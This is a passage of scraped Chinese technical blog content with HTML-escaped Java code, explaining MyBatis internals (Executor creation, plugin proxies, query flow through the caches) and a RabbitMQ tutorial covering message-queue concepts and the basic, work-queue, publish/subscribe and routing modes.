*/      final Executor executor = configuration.newExecutor(tx, execType);      //创建返回一个DeaultSqlSessoin对象返回      return new DefaultSqlSession(configuration, executor, autoCommit);    &#125; catch (Exception e) &#123;      closeTransaction(tx); // may have fetched a connection so lets call close()      throw ExceptionFactory.wrapException(&quot;Error opening session.  Cause: &quot; + e, e);    &#125; finally &#123;      ErrorContext.instance().reset();    &#125;  &#125;          \n\n创建Executor上述代码中创建了一个Mybatis中的一大核心对象Executor。\nMybatis中有三种基本的Executor执行器的实现，SimpleExecutor、ReuseExecutor和BatchExecutor。\n此外还有两种执行器CachingExecutor【二级缓存】、BaseExecutor【一级缓存】\n这两者执行器实际上都是委托三个基本的执行器去执行的\n可通过全局配置文件中的defaultExecutorType属性进行设置，默认值为SIMPLE。\n\nSimpleExecutor：每执行一次update或select，就开启一个Statement对象，用完立刻关闭Statement对象。\nReuseExecutor：执行update或select，以sql作为key查找Statement对象，存在就使用，不存在就创建，用完后，不关闭Statement对象，而是放置于Map内，供下一次使用。简言之，就是重复使用Statement对象。\nBatchExecutor：执行update时（JDBC批处理不支持select），将所有sql都通过addBatch添加到批处理中，等待统一执行executeBatch，它缓存了多个Statement对象，每个Statement对象都是添加完毕后，等待逐一执行批处理。\n\nExecutor的这些特点，都严格限制在SqlSession生命周期范围内。接着到Configuration类的newExecutor方法中分析一下Executor的创建过程：\npublic Executor newExecutor(Transaction transaction, ExecutorType executorType) &#123;    // 默认为SimpleExecutor    executorType = executorType == null ? defaultExecutorType : executorType;    executorType = executorType == null ? ExecutorType.SIMPLE : executorType;    Executor executor;    // 判断执行器的类型    // 批量执行器BatchExecutor    if (ExecutorType.BATCH == executorType) &#123;        executor = new BatchExecutor(this, transaction);    &#125; else if (ExecutorType.REUSE == executorType) &#123;        //可重复使用的执行器        executor = new ReuseExecutor(this, transaction);    &#125; else &#123;        //简单的sql执行器对象        executor = new SimpleExecutor(this, transaction);    &#125;    //判断mybatis的全局配置文件是否开启缓存    if (cacheEnabled) &#123;        //把当前的简单的执行器包装成一个CachingExecutor        //装饰器模式        executor = new CachingExecutor(executor);    &#125;    // 调用InterceptorChain的pluginAll方法    // 会调用所有拦截器对象的plugin方法，这里会将Executor进行动态代理    executor = (Executor) interceptorChain.pluginAll(executor);    return executor;&#125;// 这里传入的target是Executorpublic Object pluginAll(Object target) &#123;  // 之前解析配置文件时将所有的plugin解析为Interceptor  // 这里遍历所有的Interceptor    for (Interceptor interceptor : interceptors) &#123;    // 调用Interceptor的plugin方法    // 可能返回一个代理对象    // 由于可能会存在多个插件，所以这里会形成代理中套代理的情况    target = interceptor.plugin(target);  &#125;  return target;&#125;// 自定义插件类实现Interceptor接口的plugin方法public Object plugin(Object target) &#123;    // 接口中默认的实现是调用Plugin的wrap方法    // 这里基本不会修改，按照默认的即可    return Plugin.wrap(target, this);&#125;// 参数target是Executor对象，interceptor是自定义插件对象public static Object wrap(Object target, Interceptor interceptor) &#123;    // 获得interceptor配置的@Signature的type    Map&lt;Class&lt;?&gt;, Set&lt;Method&gt;&gt; signatureMap = getSignatureMap(interceptor);    // 当前代理类型 为Execcutor的子类    Class&lt;?&gt; type = target.getClass();    // 根据当前target的类型和@signature中指定的type进行配对    // 如果配对成功则可以进行动态代理    Class&lt;?&gt;[] interfaces = getAllInterfaces(type, signatureMap);    //匹配成功    if (interfaces.length &gt; 0) &#123;        return Proxy.newProxyInstance(            type.getClassLoader(),            interfaces,            // invocationHandler传入的是一个Plugin对象            // 说明调用代理对象时执行的invoke方法就在Plugin类中实现            new Plugin(target, interceptor, signatureMap));    &#125;    // 如果没有匹配上，那就返回原target对象    return target;&#125;\n\n到这里，Executor对象就创建完了，最后将其设置到DefaultSqlSession对象中并返回。\n 简单总结\n\n拿到SqlSessionFactory对象后，会调用SqlSessionFactory的openSesison方法，这个方法会创建一个Sql执行器（Executor），这个Sql执行器会代理你配置的拦截器方法。\n获得上面的Sql执行器后，会创建一个SqlSession（默认使用DefaultSqlSession）,这个SqlSession中也包含了Configration对象，所以通过SqlSession也能拿到全局配置；\n获得SqlSession对象后就能执行各种CRUD方法了。\n\n执行Sql我们就拿案例中的selectOne为例，分析执行Sql的流程。找到DefaultSqlSession的selectOne方法：\n /**  * 方法实现说明:查询我们当个对象  * @author:xsls  * @param statement:我们的statementId(com.tuling.mapper.EmployeeMapper.findOne)  * @param parameter:调用时候的参数  * @return: T 返回结果  * @exception:  * @date:2019/9/9 20:26  */ @Override public &lt;T&gt; T selectOne(String statement, Object parameter) &#123;// 调用的selectList   List&lt;T&gt; list = this.selectList(statement, parameter);   //若查询出来有且有一个一个对象，直接返回要给   if (list.size() == 1) &#123;     return list.get(0);   &#125; else if (list.size() &gt; 1) &#123;     //查询多个 抛出异常     throw new TooManyResultsException(&quot;Expected one result (or null) to be returned by selectOne(), but found: &quot; + list.size());   &#125; else &#123;     return null;   &#125; &#125; public &lt;E&gt; List&lt;E&gt; selectList(String statement, Object parameter) &#123;   return this.selectList(statement, parameter, RowBounds.DEFAULT); &#125; @Override public &lt;E&gt; List&lt;E&gt; selectList(String statement, Object parameter, RowBounds rowBounds) &#123;   try &#123;     //通过我们的statement去我们的全局配置类中获取MappedStatement     MappedStatement ms = configuration.getMappedStatement(statement);      // 通过执行器Executor去执行sql对象MappedStatement      // 首先通过wrapCollection方法包装参数      // 在二级缓存默认开启的情况下调用的是CachingExecutor的query方法     return executor.query(ms, wrapCollection(parameter), rowBounds, Executor.NO_RESULT_HANDLER);   &#125; catch (Exception e) &#123;     throw ExceptionFactory.wrapException(&quot;Error querying database.  Cause: &quot; + e, e);   &#125; finally &#123;     ErrorContext.instance().reset();   &#125; &#125; private Object wrapCollection(final Object object) &#123;   //若我们的参数类型是Collection   if (object instanceof Collection) &#123;     StrictMap&lt;Object&gt; map = new StrictMap&lt;&gt;();     //把他key为collection存放到map中     map.put(&quot;collection&quot;, object);     //若我们参数类型是list类型  把key为list作为集合存放到map中     if (object instanceof List) &#123;       map.put(&quot;list&quot;, object);     &#125;     return map;   &#125; else if (object != null &amp;&amp; object.getClass().isArray()) &#123;     //若是数组，存放key为array的map中     StrictMap&lt;Object&gt; map = new StrictMap&lt;&gt;();     map.put(&quot;array&quot;, object);     return map;   &#125;   return object; &#125;\n\n接下来我们跟进CachingExecutor的query方法：\n\n注意：如果有拦截器匹配的话，这里的CachingExecutor就是代理对象，那么首先会执行拦截器中的intercept方法。后续还有三个对象StatementHandler、ResultSetHandler和ParameterHandler也是同样的道理。\n\n@Overridepublic &lt;E&gt; List&lt;E&gt; query(MappedStatement ms, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException &#123;    // 调用MappedStatement的getBoundSql方法解析Sql语句    // 因为之前我们将动态Sql解析成一个个SqlNode节点，这里需要根据参数进行拼装    // 通过SQLNode使用责任链的方式解析SQL    // 方法中会通过SqlSource对象从根节点开始调用所有SqlNode节点的apply方法    // 会解析 #&#123;&#125; 和 OGNL 表达式等信息，最后拼装得到一个最终的Sql语句BoundSql    BoundSql boundSql = ms.getBoundSql(parameterObject);    //缓存的KEY    CacheKey key = createCacheKey(ms, parameterObject, rowBounds, boundSql);    return query(ms, parameterObject, rowBounds, resultHandler, key, boundSql);&#125;@Overridepublic &lt;E&gt; List&lt;E&gt; query(MappedStatement ms, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql)    throws SQLException &#123;    //判断是否开启了二级缓存    Cache cache = ms.getCache();    //如果开启了    if (cache != null) &#123;        // 判断是否需要刷新缓存        flushCacheIfRequired(ms);        if (ms.isUseCache() &amp;&amp; resultHandler == null) &#123;            ensureNoOutParams(ms, boundSql);            // 先去二级缓存中获取            // TransactionalCacheManager的getObject方法，责任链模式调用：            // TransactionalCache-&gt;SychronizedCahche-&gt;LoggingCache-&gt;SerializedCache            // -&gt;(ScheduldeCache-&gt;)LruCache-&gt;PerpetaulCache 之前我们已经介绍过了            @SuppressWarnings(&quot;unchecked&quot;)            List&lt;E&gt; list = (List&lt;E&gt;) tcm.getObject(cache, key);            // 二级缓存中没有获取到            if (list == null) &#123;                // 通过查询一级缓存和数据库去查询                // 这里会调用SimpleExecutor父类BaseExecutor的query方法                list = delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql);                // 查询到结果后加入二级缓存中                tcm.putObject(cache, key, list); // issue #578 and #116            &#125;            return list;        &#125;    &#125;    // 没有开启二级缓存,直接去查询    return delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql);&#125;\n\n我们第一次去的时候，二级缓存中必然查询不到，需要委托SimpleExecutor来帮助查询，而在SimpleExecutor中是没有重写查询方法的，需要交付给其父类BaseExecutor的query方法。\n@SuppressWarnings(&quot;unchecked&quot;)@Overridepublic &lt;E&gt; List&lt;E&gt; query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException &#123;    ErrorContext.instance().resource(ms.getResource()).activity(&quot;executing a query&quot;).object(ms.getId());    //已经关闭，则抛出 ExecutorException 异常    if (closed) &#123;        throw new ExecutorException(&quot;Executor was closed.&quot;);    &#125;    // 如果queryStack为零并且配置了清空本地缓存    if (queryStack == 0 &amp;&amp; ms.isFlushCacheRequired()) &#123;        //清空本地缓存        clearLocalCache();    &#125;    List&lt;E&gt; list;    try &#123;        // 从一级缓存中，获取查询结果        queryStack++;        list = resultHandler == null ? (List&lt;E&gt;) localCache.getObject(key) : null;        // 从一级缓存中获取到，则进行处理        if (list != null) &#123;            // 通过handleLocallyCachedOutputParameters进行处理            handleLocallyCachedOutputParameters(ms, key, parameter, boundSql);        &#125; else &#123;            // 获得不到，则从数据库中查询            list = queryFromDatabase(ms, parameter, rowBounds, resultHandler, key, boundSql);        &#125;    &#125; finally &#123;        queryStack--;    &#125;    if (queryStack == 0) &#123;        for (DeferredLoad deferredLoad : deferredLoads) &#123;            deferredLoad.load();        &#125;        // issue #601        deferredLoads.clear();        if (configuration.getLocalCacheScope() == LocalCacheScope.STATEMENT) &#123;            // issue #482            clearLocalCache();        &#125;    &#125;    return list;&#125;// 去数据库中查询private &lt;E&gt; List&lt;E&gt; queryFromDatabase(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException &#123;    List&lt;E&gt; list;    localCache.putObject(key, EXECUTION_PLACEHOLDER);    try &#123;        // 调用doQuery方法        list = doQuery(ms, parameter, rowBounds, resultHandler, boundSql);    &#125; finally &#123;        localCache.removeObject(key);    &#125;    //向一级缓存中获取值    localCache.putObject(key, list);    if (ms.getStatementType() == StatementType.CALLABLE) &#123;        localOutputParameterCache.putObject(key, parameter);    &#125;    return list;&#125;\n\n数据库查询public &lt;E&gt; List&lt;E&gt; doQuery(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql) throws SQLException &#123;  Statement stmt = null;  try &#123;    // 获取Configuration对象    Configuration configuration = ms.getConfiguration();    // 创建StatementHandler对象，这也是Mybatis的一个核心对象    // 这里同样会根据插件进行代理，过程和Executor一样    // 具体实现类是RoutingStatementHandler，它默认包装了PreparedStatementHandler    // 另外内部还封装了ParameterHandler和ResultSetHandler    StatementHandler handler = configuration.newStatementHandler(wrapper, ms, parameter, rowBounds, resultHandler, boundSql);    // 调用prepareStatement方法，得到一个PreparedStatement    stmt = prepareStatement(handler, ms.getStatementLog());    // 调用RoutingStatementHandler的query方法得到查询结果    // 这里的RoutingStatementHandler可能是代理对象，首先需要调用拦截器    return handler.query(stmt, resultHandler);  &#125; finally &#123;    // 追后关闭Statement    closeStatement(stmt);  &#125;&#125;// 调用prepareStatement方法，得到一个PreparedStatement  private Statement prepareStatement(StatementHandler handler, Log statementLog) throws SQLException &#123;    Statement stmt;    // 通过事务管理器获取数据库连接Connection    // 默认是JdbcTransaction即&lt;transactionManager type=&quot;JDBC&quot;/&gt;    Connection connection = getConnection(statementLog);    // 调用RoutingStatementHandler的prepare方法    stmt = handler.prepare(connection, transaction.getTimeout());    handler.parameterize(stmt);    return stmt;  &#125;\n\n接着来到RoutingStatementHandler类中：\npublic Statement prepare(Connection connection, Integer transactionTimeout) throws SQLException &#123;  // 这里的delegate默认是PreparedStatementHandler，调用它的prepare方法  return delegate.prepare(connection, transactionTimeout);&#125;public &lt;E&gt; List&lt;E&gt; query(Statement statement, ResultHandler resultHandler) throws SQLException &#123;  // 调用PreparedStatementHandler的query方法  return delegate.query(statement, resultHandler);&#125;\n\n最终来到PreparedStatementHandler类中：\npublic Statement prepare(Connection connection, Integer transactionTimeout) throws SQLException &#123;  ErrorContext.instance().sql(boundSql.getSql());  Statement statement = null;  try &#123;    // 实例化Statement对象，默认为PreparedStatement    statement = instantiateStatement(connection);    // 设置超时时间    setStatementTimeout(statement, transactionTimeout);    setFetchSize(statement);    return statement;  &#125; catch (SQLException e) &#123;    closeStatement(statement);    throw e;  &#125; catch (Exception e) &#123;    closeStatement(statement);    throw new ExecutorException(&quot;Error preparing statement.  Cause: &quot; + e, e);  &#125;&#125;  //SimpleStatementHandler的方法public &lt;E&gt; List&lt;E&gt; query(Statement statement, ResultHandler resultHandler) throws SQLException &#123;  PreparedStatement ps = (PreparedStatement) statement;  // 通过PreparedStatement的execute方法执行  ps.execute();  // 通过ResultSetHandler的handleResultSets处理结果集  return resultSetHandler.handleResultSets(ps);&#125;\n\n这就是基于StatementId方式执行Sql语句的大致流程。\n插件的调用插件的主要拦截Executor、StatementHandler、ResultSetHandler和ParameterHandler这四个对象的方法，如果有插件匹配这四个对象，则在创建这些对象的时候会进行JDK动态代理，代理的过程在上述创建Executor的流程中已经分析了。\n另外，比如说有多个插件匹配了Executor，那么会对Executor进行层层代理，最终得到一个经过多层代理的对象。我们再回顾一下创建动态代理的代码：\n// 参数target是Executor对象，interceptor是自定义插件对象public static Object wrap(Object target, Interceptor interceptor) &#123;    // 获得interceptor配置的@Signature的type    Map&lt;Class&lt;?&gt;, Set&lt;Method&gt;&gt; signatureMap = getSignatureMap(interceptor);    // 当前代理类型 为Execcutor的子类    Class&lt;?&gt; type = target.getClass();    // 根据当前target的类型和@signature中指定的type进行配对    // 如果配对成功则可以进行动态代理    Class&lt;?&gt;[] interfaces = getAllInterfaces(type, signatureMap);    //匹配成功    if (interfaces.length &gt; 0) &#123;        return Proxy.newProxyInstance(            type.getClassLoader(),            interfaces,            // invocationHandler传入的是一个Plugin对象            // 说明调用代理对象时执行的invoke方法就在Plugin类中实现            new Plugin(target, interceptor, signatureMap));    &#125;    // 如果没有匹配上，那就返回原target对象    return target;&#125;\n\n我们就拿Executor举例，创建动态代理时invocationHandler参数传入的是一个Plugin对象，那说明调用代理对象时执行的invoke方法就在Plugin类中实现：\npublic Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;  try &#123;    Set&lt;Method&gt; methods = signatureMap.get(method.getDeclaringClass());    if (methods != null &amp;&amp; methods.contains(method)) &#123;      // 调用当前拦截器interceptor的intercept方法      // interceptor是Plugin的成员变量      return interceptor.intercept(new Invocation(target, method, args));    &#125;    // 通过method.invoke执行被代理对象target的对应方法，target是Plugin的成员变量    // 如果被代理对象target仍然是一个代理对象，表示后续还有拦截器需要执行    // 那么又会回到这个方法，执行下一个拦截器    return method.invoke(target, args);  &#125; catch (Exception e) &#123;    throw ExceptionUtil.unwrapThrowable(e);  &#125;&#125;\n\n可以看到Mybatis中如果对于同一个拦截对象存在多个插件，那么他的调用是从最外层代理对象开始，不断调用内层代理对象的过程。所以定义在最前面的插件执行顺序排在最后。、Mybatis执行的整体流程图如下：\n\n","tags":["2021"]},{"title":"RabbitMQ","url":"/2021/06/07/2021/RabbitMQ/","content":"\n\nRabbitMQ简介消息队列(MQ)MQ全称 Message Queue（消息队列），是在消息的传输过程中保存消息的容器。多用于分布式系统之间进行通信。消息队列是一种应用程序对应用程序的通信方法。\n应用程序通过读写出入队列的消息来通信，而无需专用链接来连接它们。消息传递指的是程序间通过在消息中发送数据进行通信，而不是通过直接调用彼此进行通信。\n消息队列是典型的：生产者、消费者模型。生产者不断向消息队列中生产消息，消费者不断的从队列中获取消息。因为消息的生产和消费都是异步的，而且只关心消息的发送和接收，没有业务逻辑的侵入，这样就实现了生产者和消费者的解耦。\n开发中消息队列通常有如下应用场景：\n\n任务异步处理将不需要同步处理的并且耗时长的操作由消息队列通知消息接收方进行异步处理，提高了应用程序的响应时间。\n应用程序解耦合MQ相当于一个中介，生产方通过MQ与消费方交互，它将应用程序进行解耦合。\n流量削峰应用系统如果遇到系统请求流量的瞬间猛增，有可能会将系统压垮。有了消息队列可以将大量请求缓存起来，分散到很长一段时间处理，这样可以大大提到系统的稳定性和用户体验。\n\n\n\n消息分发通过消息队列可以让数据在多个系统更加之间进行流通。数据的产生方不需要关心谁来使用数据，只需要将数据发送到消息队列，数据使用方直接在消息队列中直接获取数据即可。\n\nAMQP和JMS\nAMQPAMQP，即Advanced Message Queuing Protocol，一个提供统一消息服务的应用层标准高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端&#x2F;中间件不同产品，不同的开发语言等条件的限制。Erlang中的实现有RabbitMQ等。\nJMSJMS即Java消息服务（Java Message Service）应用程序接口，是一个Java平台中关于面向消息中间件（MOM）的API，用于在两个应用程序之间，或分布式系统中发送消息，进行异步通信。Java消息服务是一个与具体平台无关的API，绝大多数MOM提供商都对JMS提供支持。\nAMQP与JMS的区别①JMS是定义了统一的接口，来对消息操作进行统一；AMQP是通过规定协议来统一数据交互的格式②JMS限定了必须使用Java语言；AMQP只是协议，不规定实现方式，因此是跨语言的。③JMS规定了两种消息模型；而AMQP的消息模型更加丰富\n\n常见的MQ产品\nActiveMQ：基于JMS\nRabbitMQ：基于AMQP协议，erlang语言开发，稳定性好\nRocketMQ：基于JMS，阿里巴巴产品，目前交由Apache基金会\nKafka：分布式消息系统，高吞吐量\n\n\n为什么使用RabbitMQ?① 使用简单，功能强大。② 基于AMQP协议。③ 社区活跃，文档完善。④ 高并发性能好，这主要得益于Erlang语言。⑤ SpringBoot默认已集成RabbitMQ\nRabbitMQ下图是RabbitMQ的基本结构：\n组成部分说明如下：\n\nConnection：无论生产者还是消费者，都需要与RabbitMQ建立连接后才可以完成消息的生产和消费。\nChannel：通道，建立连接后，会形成通道，消息的投递获取依赖通道。\nBroker：消息队列服务进程，此进程包括两个部分：Exchange和Queue。\nExchange：消息队列交换机，按一定的规则将消息路由转发到某个队列，对消息进行过虑。\nQueue：消息队列，存储消息的队列，消息到达队列并转发给指定的消费方。\nProducer：消息生产者，即生产方客户端，生产方客户端将消息发送到MQ。\nConsumer：消息消费者，即消费方客户端，接收MQ转发的消息。\n\n消息发布接收流程：\n\n发送消息① 生产者和Broker建立TCP连接。② 生产者和Broker建立通道。③ 生产者通过通道消息发送给Broker，由Exchange将消息进行转发。④ Exchange将消息转发到指定的Queue（队列) 。\n接收消息① 消费者和Broker建立TCP连接 。② 消费者和Broker建立通道 。③ 消费者监听指定的Queue（队列） 。④ 当有消息到达Queue时Broker默认将消息推送给消费者。⑤ 消费者接收到消息。\n\n各种模式基本消息模型\n图示P（producer):生产者C（consumer):消费者红色区域：消息队列Queue\n流程发送端操作流程：创建连接-&gt;创建通道-&gt;声明队列-&gt;发送消息接收端：创建连接-&gt;创建通道-&gt;声明队列-&gt;监听队列-&gt;ack回复\n\n首先获取连接\npublic class RabbitUtils &#123;    private static ConnectionFactory connectionFactory = new ConnectionFactory();    //配置参数    static &#123;        connectionFactory.setHost(&quot;127.0.0.1&quot;);        connectionFactory.setPort(5672);//5672是RabbitMQ的默认端口号        connectionFactory.setUsername(&quot;liduoan&quot;);        connectionFactory.setPassword(&quot;liduoan&quot;);        connectionFactory.setVirtualHost(&quot;/liduoan_demo&quot;);    &#125;    //调用该方法获取mq的连接    public static Connection getConnection()&#123;        Connection conn = null;        try &#123;            //具体调用            conn = connectionFactory.newConnection();            return conn;        &#125; catch (Exception e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;\n\n如此可以使得每次调用就完成连接的建立了。\n现在就是生产者和消费者的建立了\n生产者public class Producer &#123;    public static void main(String[] args) throws IOException, TimeoutException &#123;        //获取TCP长连接        Connection conn = RabbitUtils.getConnection();        //创建通信“通道”，相当于TCP中的虚拟连接        Channel channel = conn.createChannel();        //创建队列,声明并创建一个队列，如果队列已存在，则使用这个队列        //第一个参数：队列名称ID        //第二个参数：是否持久化，false对应不持久化数据，MQ停掉数据就会丢失        //第三个参数：是否队列私有化，false则代表所有消费者都可以访问，true代表只有第一次拥有它的消费者才能一直使用，其他消费者不让访问        //第四个：是否自动删除,false代表连接停掉后不自动删除掉这个队列        //其他额外的参数, null        channel.queueDeclare(RabbitConstant.QUEUE_HELLOWORLD,false, false, false, null);        String message = &quot;hello白起666&quot;;        //四个参数        //exchange 交换机，暂时用不到，在后面进行发布订阅时才会用到        //队列名称        //额外的设置属性        //最后一个参数是要传递的消息字节数组        channel.basicPublish(&quot;&quot;, RabbitConstant.QUEUE_HELLOWORLD, null,message.getBytes());        channel.close();        conn.close();        System.out.println(&quot;===发送成功===&quot;);\t\t//建立连接 创建通道 连接队列 推送信息    &#125;&#125;\n\n消费者public class Consumer &#123;    public static void main(String[] args) throws IOException, TimeoutException &#123;        //获取TCP长连接         Connection conn = RabbitUtils.getConnection();        //创建通信“通道”，相当于TCP中的虚拟连接        Channel channel = conn.createChannel();        //创建队列,声明并创建一个队列，如果队列已存在，则使用这个队列        //第一个参数：队列名称ID        //第二个参数：是否持久化，false对应不持久化数据，MQ停掉数据就会丢失        //第三个参数：是否队列私有化，false则代表所有消费者都可以访问，true代表只有第一次拥有它的消费者才能一直使用，其他消费者不让访问        //第四个：是否自动删除,false代表连接停掉后不自动删除掉这个队列        //其他额外的参数, null        channel.queueDeclare(            RabbitConstant.QUEUE_HELLOWORLD,false, false, false, null);        //从MQ服务器中获取数据        //创建一个消息消费者        //第一个参数：队列名        //第二个参数代表是否自动确认收到消息，false代表手动编程来确认消息，这是MQ的推荐做法        //第三个参数要传入DefaultConsumer的实现类        channel.basicConsume(            RabbitConstant.QUEUE_HELLOWORLD, false, new Reciver(channel));    &#125;&#125;class  Reciver extends DefaultConsumer &#123;    private Channel channel;    //重写构造函数,Channel通道对象需要从外层传入，在handleDelivery中要用到    public Reciver(Channel channel) &#123;        super(channel);        this.channel = channel;    &#125;    @Override    public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;         String message = new String(body);         System.out.println(&quot;消费者接收到的消息：&quot;+message);         System.out.println(&quot;消息的TagId：&quot;+envelope.getDeliveryTag());        //false只确认签收当前的消息，设置为true的时候则代表签收该消费者所有未签收的消息        channel.basicAck(envelope.getDeliveryTag(), false);    &#125;&#125;\n\n简单的获取连接—-创建通道Channel—–连接队列—–消费数据—–通过DefaultConsumer的实现类内方法完成数据处理，签收信息。\nWork queues工作队列模式\nWork Queues：与入门程序的简单模式相比，多了一个或一些消费端，多个消费端共同消费同一个队列中的消息。应用场景：对于任务过重或任务较多情况使用工作队列可以提高任务处理的速度。\nWork Queues 与入门程序的简单模式的代码几乎是一样的。可以完全复制，并多复制一个消费者进行多个消费者同时对消费消息的测试。\n其生产者代码为：\npublic class OrderSystem &#123;    public static void main(String[] args) throws IOException, TimeoutException &#123;        Connection connection = RabbitUtils.getConnection();        //建立通道        Channel channel = connection.createChannel();        //连接队列        channel.queueDeclare(RabbitConstant.QUEUE_SMS, false, false, false, null);\t\t//发送100条消息        for(int i = 1 ; i &lt;= 100 ; i++) &#123;            SMS sms = new SMS(&quot;乘客&quot; + i, &quot;13900000&quot; + i, &quot;您的车票已预订成功&quot;);            String jsonSMS = new Gson().toJson(sms);            channel.basicPublish(&quot;&quot; , RabbitConstant.QUEUE_SMS , null , jsonSMS.getBytes());        &#125;        System.out.println(&quot;发送数据成功&quot;);        //注意关连接        channel.close();        connection.close();    &#125;&#125;\n\n其消费者为：\npublic class SMSSender3 &#123;    public static void main(String[] args) throws IOException &#123;        //建立长连接        Connection connection = RabbitUtils.getConnection();        final Channel channel = connection.createChannel();        //连接队列        channel.queueDeclare(RabbitConstant.QUEUE_SMS, false, false, false, null);        //如果不写basicQos（1），则自动MQ会将所有请求平均发送给所有消费者        //basicQos(1)的调用会使得MQ不再对消费者一次发送多个请求        //而是消费者处理完一个消息后（确认后），在从队列中获取一个新的        channel.basicQos(1);//处理完一个取一个\t\t//获取到队列之后消费消息        channel.basicConsume(RabbitConstant.QUEUE_SMS , false ,                              //这里是匿名内部类的创建                             new DefaultConsumer(channel)&#123;            @Override            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                //完成消息的处理                String jsonSMS = new String(body);                System.out.println(&quot;SMSSender3-短信发送成功:&quot; + jsonSMS);\t\t\t\t//                try &#123;                    Thread.sleep(500);                &#125; catch (InterruptedException e) &#123;                    e.printStackTrace();                &#125;                channel.basicAck(envelope.getDeliveryTag() , false);            &#125;        &#125;);    &#125;&#125;\n\n和基本消息模型的区别在于，有多个消费者，他们会分批获取一定量的消息。\n订阅模式\n在订阅模型中，多了一个 Exchange 角色，而且过程略有变化：P：生产者，也就是要发送消息的程序，但是不再发送到队列中，而是发给X（交换机）C：消费者，消息的接收者，会一直等待消息到来Queue：消息队列，接收消息、缓存消息Exchange：交换机（X）。一方面，接收生产者发送的消息。另一方面，知道如何处理消息，例如递交给某个特别队列、递交给所有队列、或是将消息丢弃。到底如何操作，取决于Exchange的类型。\nExchange有常见以下3种类型：Fanout：广播，将消息交给所有绑定到交换机的队列Direct：定向，把消息交给符合指定routing key 的队列Topic：通配符，把消息交给符合routing pattern（路由模式） 的队列Exchange（交换机）只负责转发消息，不具备存储消息的能力，因此如果没有任何队列与 Exchange 绑定，或者没有符合路由规则的队列，那么消息会丢失！\n基本订阅模式基本的订阅模式，也就是生产者发送数据，交换机根据绑定情况【队列会绑定交换机】发送给目标队列。\n队列再进行消费消息。\n生产者代码：\npublic class WeatherBureau &#123;    public static void main(String[] args) throws Exception &#123;        //长连接        Connection connection = RabbitUtils.getConnection();        //获取输入消息        String input = new Scanner(System.in).next();        //建立通道        Channel channel = connection.createChannel();\t\t//发布消息        //第一个参数交换机名字   其他参数和之前的一样        channel.basicPublish(RabbitConstant.EXCHANGE_WEATHER,&quot;&quot; , null , input.getBytes());        channel.close();        connection.close();    &#125;&#125;\n\n看得出生产者代码和基本消息、工作队列的区别是不需要建立\\获取队列，仅仅只需要发布消息，然后在消息发布中确定好对应的交换机名称。说明是对着交换机进行消息发送。\n消费者代码：\npublic class Sina &#123;    public static void main(String[] args) throws IOException &#123;        //获取TCP长连接        Connection connection = RabbitUtils.getConnection();        //获取虚拟连接通道        final Channel channel = connection.createChannel();        //声明队列信息  RabbitConstant.QUEUE_SINA  队列名        channel.queueDeclare(RabbitConstant.QUEUE_SINA, false, false, false, null);        //queueBind用于将队列与交换机绑定        //参数1：队列名 参数2：交互机名  参数三：路由key（暂时用不到)        channel.queueBind(RabbitConstant.QUEUE_SINA, RabbitConstant.EXCHANGE_WEATHER, &quot;&quot;);        channel.basicQos(1);        //消费消息        channel.basicConsume(RabbitConstant.QUEUE_SINA , false ,                              new DefaultConsumer(channel)&#123;            @Override            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                //消息处理                System.out.println(&quot;新浪天气收到气象信息：&quot; + new String(body));                channel.basicAck(envelope.getDeliveryTag() , false);            &#125;        &#125;);    &#125;&#125;\n\n\n交换机需要与队列进行绑定，绑定之后；一个消息可以被多个消费者都收到。\n发布&#x2F;订阅模式需要设置队列和交换机的绑定，工作队列模式不需要设置，实际上工作队列模式会将队列绑定到默认的交换机 \n发布订阅模式与工作队列模式的区别： 工作队列模式不用定义交换机，而发布&#x2F;订阅模式需要定义交换机 发布&#x2F;订阅模式的生产方是面向交换机发送消息，工作队列模式的生产方是面向队列发送消息(底层使用默认交换机)\n\nRouting 路由模式\n队列与交换机的绑定，不能是任意绑定了，而是要指定一个 RoutingKey（路由key）\n消息的发送方在向 Exchange 发送消息时，也必须指定消息的 RoutingKey\nExchange 不再把消息交给每一个绑定的队列，而是根据消息的 Routing Key 进行判断，只有队列的Routingkey 与消息的 Routing key 完全一致，才会接收到消息\n具体代码展示：\n生产者：\npublic class WeatherBureau &#123;    public static void main(String[] args) throws Exception &#123;        Map area = new LinkedHashMap&lt;String, String&gt;();        area.put(&quot;china.hunan.changsha.20201127&quot;, &quot;中国湖南长沙20201127天气数据&quot;);        area.put(&quot;china.hubei.wuhan.20201127&quot;, &quot;中国湖北武汉20201127天气数据&quot;);        area.put(&quot;china.hunan.zhuzhou.20201127&quot;, &quot;中国湖南株洲20201128天气数据&quot;);        area.put(&quot;us.cal.lsj.20201127&quot;, &quot;美国加州洛杉矶20201127天气数据&quot;);        area.put(&quot;china.hebei.shijiazhuang.20201128&quot;, &quot;中国河北石家庄20201128天气数据&quot;);        area.put(&quot;china.hubei.wuhan.2020112 8&quot;, &quot;中国湖北武汉20201128天气数据&quot;);        area.put(&quot;china.henan.zhengzhou.20201128&quot;, &quot;中国河南郑州20201128天气数据&quot;);        area.put(&quot;us.cal.lsj.20201128&quot;, &quot;美国加州洛杉矶20201128天气数据&quot;);        Connection connection = RabbitUtils.getConnection();        Channel channel = connection.createChannel();\t\t// 发送数据        Iterator&lt;Map.Entry&lt;String, String&gt;&gt; itr = area.entrySet().iterator();        while (itr.hasNext()) &#123;            Map.Entry&lt;String, String&gt; me = itr.next();            //第一个参数交换机名字   第二个参数作为 消息的routing key            